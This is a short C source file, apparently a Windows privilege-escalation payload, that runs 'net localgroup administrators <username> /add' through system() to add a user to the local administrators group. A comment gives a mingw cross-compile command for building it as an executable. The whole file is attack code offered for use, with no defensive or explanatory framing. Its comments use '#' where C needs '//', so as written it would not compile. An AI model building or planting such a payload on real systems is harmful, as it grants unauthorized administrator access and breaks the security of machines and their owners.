#include <stdlib.h>

#Simple system command to add current user to administrators local group.
#Compile with, i586-mingw32msvc-gcc useradd.c -o useradd.exe

int main ()
{
  int i;
  i=system ("net localgroup administrators <username> /add");
  return 0;
}
